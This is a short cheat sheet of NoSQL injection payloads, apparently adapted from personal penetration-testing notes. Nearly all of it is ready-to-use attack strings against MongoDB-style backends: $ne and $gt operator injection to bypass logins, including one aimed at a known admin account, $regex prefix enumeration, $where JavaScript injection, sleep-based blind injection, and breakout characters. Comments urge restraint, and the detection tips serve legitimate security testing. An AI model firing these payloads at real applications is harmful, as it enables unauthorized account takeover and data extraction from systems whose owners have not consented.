# NoSQL injection payloads  (adapted from the user's 0daysec notes: no-sql-injection.md)
# Benign auth-bypass / minimal differential. No bulk dump, no DB-hanging $where. Rate-limit.

## Operator injection — auth bypass (the common one)
PHP array bracket notation (PHP interprets `user[$ne]=x` as an array):
```
user[$ne]=xxxx&pass[$ne]=yyyy          # $ne = "not equal" -> matches many records -> auth as first user
```
JSON body:
```json
{"username":{"$ne":null},"password":{"$ne":null}}
{"username":{"$gt":""},"password":{"$gt":""}}
{"username":"admin","password":{"$ne":"x"}}        # target a known user
```
Other operators: `$in`, `$nin`, `$gt`, `$lt`, `$exists`, `$regex`.

## Query manipulation / extraction
```json
{"username":{"$regex":"^adm"}}                      # enumerate by prefix
{"id":{"$gt":0}}                                    # return more than intended
```

## $where JS injection (MongoDB server-side JS)
```
username=admin'||'1'=='1
'; return true; var x='              # inject into a $where string
{"$where":"this.username=='admin'"}
```

## Blind (minimal, short)
```
# time (keep sleeps short, rate-limited):
{"$where":"sleep(2000)"}
# boolean per-char (extract minimal marker only):
{"username":{"$regex":"^a"}}  ...  ^aa  ...  (confirm true/false by response)
```

## Syntax injection
```
'  "  `  \  ;  {  }      # breakout chars; less common (libraries sanitize) — try after operator injection
```

## Detection
Submit an array where a string is expected; a response change (login success, different result set, error)
flags operator injection. Confirm with a benign auth bypass. Tool: `nosqlmap` (confirm manually).
